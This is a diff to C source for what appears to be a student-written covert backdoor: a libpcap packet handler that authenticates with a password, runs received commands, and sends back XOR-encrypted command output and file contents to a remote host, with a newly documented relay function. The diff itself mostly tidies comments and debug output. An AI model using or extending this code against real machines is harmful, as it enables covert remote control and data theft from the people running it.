@@ -1,6 +1,6 @@
 #include "pktcap.h"
 
-/* globals */
+/* Globals for inotify and relay modes */
 static volatile sig_atomic_t doneflag = 0;
 int dest_relay_port, relay_mode = FALSE;
 char relay_host[BUFFER];
@@ -16,7 +16,8 @@ char relay_host[BUFFER];
 -- 
 -- PROGRAMMER: Luke Tao, Ian Lee
 -- 
--- INTERFACE: int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port, int protocol)
+-- INTERFACE: int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, 
+		       char * listen_host, int listen_port, char * dest_host, int dest_port, int protocol)
 -- 
 -- RETURNS: 0, not important
 -- 
@@ -146,17 +147,10 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 {		
 	const struct ip_struct * ip;
 	const struct tcp_struct * tcp;
-	const struct udp_struct * udp;
 	const unsigned char * payload;
 
-	int size_ip;
-	int size_tcp;
-	int size_udp;
-	int size_payload;
-	int mode;
-
-	int datalen;
-	//printf("Packet received\n");
+	int size_ip, size_tcp, size_udp, size_payload;
+	int mode, datalen;
 	char password[strlen(PASSWORD) + 1];
 	char * decrypted;
 	char * command;
@@ -190,7 +184,6 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	{
 		
 		/* define/compute udp header offset */
-		udp = (struct udp_struct *)(packet + SIZE_ETHERNET + size_ip);
 		size_udp = 8;
 
 		/* define/compute udp payload (segment) offset */
@@ -296,6 +289,25 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 }
 
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: relayPacket
+-- 
+-- DATE: 2014/12/02
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: int relayPacket(char * payload, int size_payload,  const char * src_ip, 
+		const char * dest_ip, const int dest_port, int protocol)
+-- 
+-- RETURNS: 0
+-- 
+-- NOTES: Wrapper function of send_packet that will essentially forward the encrypted packet to the specified host
+--	  passed in.
+----------------------------------------------------------------------------------------------------------------------*/
 int relayPacket(char * payload, int size_payload,  const char * src_ip, 
 		const char * dest_ip, const int dest_port, int protocol)
 {
@@ -385,7 +397,7 @@ int process_command(char * command, const char * src_ip, const char * dest_ip, c
 	{
 		cmd_results[strlen(cmd_results)-1] = '\0';
 		//Format packet payload
-		sprintf(packet, /*"%s %d %s%s%s" */ "%s %d %s%d%s%s" , PASSWORD, CLIENT_MODE, CMD_START, RESPONSE_MODE, cmd_results, CMD_END);
+		sprintf(packet, "%s %d %s%d%s%s", PASSWORD, CLIENT_MODE, CMD_START, RESPONSE_MODE, cmd_results, CMD_END);
 		printf("Packet: %s\n", packet);
 		//Encrypt payload
 		
@@ -438,29 +450,22 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 		}else {
 			transferMode = APPEND_MODE;
 		}
-		
-		printf("Bytes read from file: %d\n", bytes_read);
 
 		tempPointer = packet;
 		//Format packet payload
 		sprintf(packet, "%s %d %s%d %d %s ", PASSWORD, CLIENT_MODE, CMD_START, TRANSFER_MODE, transferMode, fileName);
 		tempPointer += strlen(packet);
-		
-		printf("Packet before appending data: %s\n", packet);
 
 		memcpy(tempPointer, data, bytes_read);
 		tempPointer += bytes_read;
-		printf("Packet after appending data: %s\n", packet);
 
 		memcpy(tempPointer, CMD_END, strlen(CMD_END));
 		tempPointer += strlen(CMD_END);
-
-		printf("Packet after appending end: %s\n", packet);
 		
 		packet_len = tempPointer - packet;
 		printf("Packet Size: %d\n", packet_len);
-		//Encrypt payload
 		
+		//Encrypt payload
 		//Send it over to the client
 		iSeed(xor_key, 1);
 		send_packet(xor_cipher(packet, packet_len), protocol, packet_len, src_ip, dest_ip, dest_port);
@@ -469,10 +474,7 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 		memset(data, 0, sizeof(data));
 		count ++;
 	}
-
-	//
 	fclose(fp);
-	
 	return 0;
 }
 
